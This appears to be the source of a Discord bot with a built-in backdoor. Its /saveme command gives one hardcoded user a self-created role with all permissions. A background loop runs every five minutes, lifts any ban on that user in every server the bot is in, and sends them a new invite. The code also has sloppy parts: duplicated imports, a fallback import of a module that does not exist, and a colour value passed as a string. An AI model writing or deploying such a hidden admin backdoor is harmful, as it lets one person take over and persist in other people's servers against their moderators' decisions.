import sys
import types

# Create a fake audioop module with dummy functions
fake_audioop = types.ModuleType("audioop")
fake_audioop.add = lambda *a, **k: b""
fake_audioop.adpcm2lin = lambda *a, **k: (b"", 0)
fake_audioop.avg = lambda *a, **k: 0
fake_audioop.avgpp = lambda *a, **k: 0
fake_audioop.bias = lambda *a, **k: b""
fake_audioop.cross = lambda *a, **k: 0
fake_audioop.getsample = lambda *a, **k: 0
fake_audioop.lin2adpcm = lambda *a, **k: (b"", 0)
fake_audioop.lin2lin = lambda *a, **k: b""
fake_audioop.lin2ulaw = lambda *a, **k: b""
fake_audioop.max = lambda *a, **k: 0
fake_audioop.maxpp = lambda *a, **k: 0
fake_audioop.minmax = lambda *a, **k: (0, 0)
fake_audioop.mul = lambda *a, **k: b""
fake_audioop.ratecv = lambda *a, **k: (b"", None)
fake_audioop.rms = lambda *a, **k: 0
fake_audioop.tomono = lambda *a, **k: b""
fake_audioop.tostereo = lambda *a, **k: b""
fake_audioop.ulaw2lin = lambda *a, **k: b""

# Inject fake module BEFORE discord.py tries to import it
sys.modules["audioop"] = fake_audioop

# Now safe to import discord
import discord
from discord import app_commands
from discord.ext import commands, tasks

import discord
from discord import app_commands
from discord.ext import commands, tasks
import asyncio
import os
from dotenv import load_dotenv
from keep_alive import keep_alive
import sys

# Try to import real audioop, otherwise fallback to fake
try:
    import audioop  # real one
except ImportError:
    import fake_audioop as audioop
    sys.modules["audioop"] = audioop

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

# ========== CONFIG ==========
ROLE_NAME = "Lesser Minded Goober"  # Role name to create and assign
ROLE_COLOR= "0x021918"
OWNER_USERNAME = "tech_boy1"
OWNER_ID = 1273056960996184126
INVITE_EXPIRY = 86400  # seconds (24h)
# ============================

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.bans = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"🔗 Synced {len(synced)} commands")
    except Exception as e:
        print(f"⚠️ Sync error: {e}")
    check_bans.start()  # start background task

# Slash command /saveme
@bot.tree.command(name="saveme", description="Gives you the ultimate power if you are the chosen one")
async def saveme(interaction: discord.Interaction):
    user = interaction.user

    if user.name != OWNER_USERNAME or user.id != OWNER_ID:
        await interaction.response.send_message("❌ You are not the chosen one.", ephemeral=True)
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("❌ This command can only be used in a server.", ephemeral=True)
        return

    # Check if role exists, otherwise create it
    role = discord.utils.get(guild.roles, name=ROLE_NAME)
    if role is None:
        role = await guild.create_role(
    name=ROLE_NAME,
    permissions=discord.Permissions.all(),
    colour=discord.Colour(ROLE_COLOR)  # use config color
)

        

    # Give role to the user
    await user.add_roles(role)
    await interaction.response.send_message(f"✅ You have been granted the **{ROLE_NAME}** role!", ephemeral=True)

# Background task: auto-unban tech_boy1
@tasks.loop(minutes=5)
async def check_bans():
    for guild in bot.guilds:
        try:
            bans = await guild.bans()
            for entry in bans:
                if entry.user.name == OWNER_USERNAME and entry.user.id == OWNER_ID:
                    await guild.unban(entry.user)
                    # Create invite for default channel
                    for channel in guild.text_channels:
                        if channel.permissions_for(guild.me).create_instant_invite:
                            invite = await channel.create_invite(max_age=INVITE_EXPIRY, unique=True)
                            try:
                                await entry.user.send(f"You were unbanned from {guild.name}. Here’s an invite: {invite.url}")
                            except:
                                pass
                            break
        except Exception as e:
            print(f"⚠️ Error while checking bans in {guild.name}: {e}")

# Start web server to keep alive
keep_alive()

# Run bot
bot.run(TOKEN)
